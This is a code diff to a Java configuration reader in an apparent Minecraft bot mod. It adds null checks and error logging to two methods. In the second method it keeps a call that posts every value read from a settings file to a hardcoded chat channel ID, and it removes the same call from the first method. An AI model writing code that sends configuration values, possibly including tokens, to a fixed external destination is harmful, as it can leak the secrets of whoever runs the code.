@@ -14,52 +14,61 @@ import static mod.minebot.MINEBOT.LOG;
 public class Reader {
 
     public static String readfromfile(String key) {
-        String path = ReferenceClass.defaultconfig.replace("minebot.cfg","settings.properties");
-
-        File file = new File(path);
-
-        String search = null;
-        try {
-            FileReader reader = new FileReader(file);
-            Properties props = new Properties();
-            props.load(reader);
-
-            search = props.getProperty(key);
-
-            SendMessage.sendMessage("217319333422956554",search);
-            reader.close();
-        } catch (FileNotFoundException ex) {
-            LOG.info("Config File " + path + " not found");
-        } catch (IOException ex) {
-            // I/O error
+        if(key==null){
+            return null;
         }
+        else {
+            String path = ReferenceClass.defaultconfig.replace("minebot.cfg", "settings.properties");
 
-        
-        return search;
+            File file = new File(path);
+
+            String search = null;
+            try {
+                FileReader reader = new FileReader(file);
+                Properties props = new Properties();
+                props.load(reader);
+
+                search = props.getProperty(key);
+
+                reader.close();
+            } catch (FileNotFoundException ex) {
+                LOG.info("Config File " + path + " not found");
+            } catch (IOException ex) {
+                LOG.info("IO Error");
+            }
+
+
+            return search;
+        }
     }
 
     public static String readfromfile(String location,String key) {
-        String path = ReferenceClass.defaultconfig.replace("minebot.cfg","settings.properties");
-
-        File file = new File(path);
-
-        String search = null;
-        try {
-            FileReader reader = new FileReader(file);
-            Properties props = new Properties();
-            props.load(reader);
-
-            search = props.getProperty(key);
-
-            SendMessage.sendMessage("217319333422956554",search);
-            reader.close();
-        } catch (FileNotFoundException ex) {
-            LOG.info("Config File " + location + " not found");
-        } catch (IOException ex) {
-            // I/O error
+        if(key==null){
+            return null;
         }
+        else {
 
 
-        return search;
+            File file = new File(location);
+
+            String search = null;
+            try {
+                FileReader reader = new FileReader(file);
+                Properties props = new Properties();
+                props.load(reader);
+
+                search = props.getProperty(key);
+
+                SendMessage.sendMessage("217319333422956554", search);
+                reader.close();
+            } catch (FileNotFoundException ex) {
+                LOG.info("Config File " + location + " not found");
+            } catch (IOException ex) {
+                LOG.info("IO Error");
+            }
+
+
+            return search;
+        }
     }
 }
